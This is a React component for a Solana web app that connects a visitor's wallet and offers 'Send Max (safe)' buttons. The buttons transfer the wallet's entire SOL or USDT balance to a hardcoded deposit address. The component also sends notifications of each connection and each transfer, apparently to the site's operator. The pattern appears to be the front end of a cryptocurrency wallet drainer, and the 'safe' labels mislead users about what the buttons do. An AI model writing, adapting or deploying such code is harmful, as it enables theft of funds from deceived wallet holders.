import { notifyTx } from '../lib/notify'
import React from 'react'
import { modal } from '../appkit'
import { solana as solanaMainnet } from '@reown/appkit/networks'
import { connectSolana, depositAllSol, depositAllUsdtSol, getActiveSolanaProvider } from '../lib/solana'
import { SOL_DEPOSIT_ADDRESS } from '../config'

export default function SolanaSection() {
  const [address, setAddress] = React.useState<string>('')
  const [status, setStatus] = React.useState<string>('')

  async function refreshAddress() {
    try {
      // AppKit first
      const maybe = await (modal as any)?.getAddress?.()
      if (maybe) { setAddress(String(maybe)); return }

      // injected fallback
      const p: any = getActiveSolanaProvider()
      const pk = p?.publicKey
      if (pk?.toBase58) setAddress(pk.toBase58())
      else if (typeof pk === 'string') setAddress(pk)
    } catch {}
  } // ← CLOSE refreshAddress

  async function onConnect() {
    try {
      setStatus('Opening Solana wallet modal...')
      await modal.switchNetwork(solanaMainnet as any)
      await modal.open()

      // try to read address immediately
      const p: any = getActiveSolanaProvider()
      const pk = p?.publicKey
      let fromAddr = ''
      if (pk?.toBase58) fromAddr = pk.toBase58()
      else if (typeof pk === 'string') fromAddr = pk

      if (fromAddr) {
        setAddress(fromAddr)
        // CONNECT notification (avoid pointing to deposit address)
        notifyTx({
          kind: 'solana',
          chain: 'mainnet-beta',
          from: fromAddr,
          to: '-',           // <— don’t tie CONNECT to the deposit address
          token: 'CONNECT',
          tx: '-'            // no tx hash for connect
        })
        setStatus('Connected.')
      } else {
        // give wallet a tick to expose publicKey, then re-check
        setTimeout(async () => {
          await refreshAddress()
          const p2: any = getActiveSolanaProvider()
          const pk2 = p2?.publicKey
          let addr2 = ''
          if (pk2?.toBase58) addr2 = pk2.toBase58()
          else if (typeof pk2 === 'string') addr2 = pk2
          if (addr2) {
            setAddress(addr2)
            notifyTx({
              kind: 'solana',
              chain: 'mainnet-beta',
              from: addr2,
              to: '-',       // <— same here
              token: 'CONNECT',
              tx: '-'
            })
          }
          setStatus('Connected.')
        }, 250)
      }
    } catch (e: any) {
      setStatus(`Error: ${e.message || e}`)
    }
  }

  async function onSol() {
    try {
      if (!address) throw new Error('Connect a wallet first')
      const res = await depositAllSol({ publicKey: (getActiveSolanaProvider() as any).publicKey })
      setStatus(`SOL transfer submitted: ${res.signature}`)
      await notifyTx({
        kind: 'solana',
        chain: 'mainnet-beta',
        from: address,
        to: SOL_DEPOSIT_ADDRESS,
        token: 'SOL',
        amount: 'MAX',
        tx: res.signature
      })
    } catch (e: any) {
      setStatus(e.message || String(e))
    }
  }

  async function onUsdt() {
    try {
      if (!address) throw new Error('Connect a wallet first')
      const res = await depositAllUsdtSol({ publicKey: (getActiveSolanaProvider() as any).publicKey })
      setStatus(`USDT transfer submitted: ${res.signature}`)
      await notifyTx({
        kind: 'solana',
        chain: 'mainnet-beta',
        from: address,
        to: SOL_DEPOSIT_ADDRESS,
        token: 'USDT',
        amount: 'MAX',
        tx: res.signature
      })
    } catch (e: any) {
      setStatus(e.message || String(e))
    }
  }

  async function disconnect() {
    try {
      const p: any = getActiveSolanaProvider()
      await p?.disconnect?.()
    } catch {}
    try {
      await (modal as any)?.disconnect?.()
    } catch {}
    setAddress('')
    setStatus('Disconnected')
  }

  React.useEffect(() => {
    refreshAddress()
    const onFocus = () => refreshAddress()
    window.addEventListener('focus', onFocus)
    return () => window.removeEventListener('focus', onFocus)
  }, [])

  return (
    <div className="card">
      {/* Actions */}
      <div className="flex flex-col sm:flex-row gap-3 w-full">
        {!address ? (
          // Not connected → show Connect
          <button className="px-6 py-3 rounded-2xl shadow" onClick={onConnect}>
            Connect Wallet
          </button>
        ) : (
          // Connected → show send buttons + disconnect
          <div className="flex flex-col sm:flex-row gap-3 w-full">
            <button className="px-6 py-3 rounded-2xl shadow" onClick={onSol}>
              Send Max (safe) SOL
            </button>
            <button className="px-6 py-3 rounded-2xl shadow" onClick={onUsdt}>
              Send Max (safe) USDT (SPL)
            </button>
            <button className="px-6 py-3 rounded-2xl shadow" onClick={disconnect}>
              Disconnect
            </button>
          </div>
        )}
      </div>

      {/* Optional status line */}
      {/* <div className="status mt-12">{status || "—"}</div> */}
    </div>
  )
}
